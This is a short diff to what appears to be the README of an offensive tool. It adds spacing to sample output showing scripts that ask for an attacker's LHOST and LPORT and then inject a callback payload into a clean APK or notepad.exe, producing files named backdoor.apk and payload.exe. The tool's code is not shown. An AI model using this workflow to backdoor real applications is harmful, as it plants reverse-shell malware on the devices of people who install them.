@@ -37,10 +37,15 @@ chmod +x apk_injector.sh
 ===============================
 
 🌐 Enter LHOST: 192.168.1.100
+
 🎯 Enter LPORT: 4444
+
 Enter the path to a clean APK file: /root/app.apk
+
 Enter the output file name (e.g., evil.apk): backdoor.apk
+
 [*] Injecting payload into /root/app.apk...
+
 [+] Payload injected successfully! Saved as: backdoor.apk
 
 
@@ -75,10 +80,15 @@ chmod +x exe_injector.sh
 ===============================
 
 🌐 Enter LHOST: 192.168.1.100
+
 🎯 Enter LPORT: 5555
+
 Enter the path to a clean EXE file (e.g., notepad.exe): /root/notepad.exe
+
 Enter the output file name (e.g., evil.exe): payload.exe
+
 [*] Injecting payload into /root/notepad.exe...
+
 [+] Payload injected successfully! Saved as: payload.exe
 
 
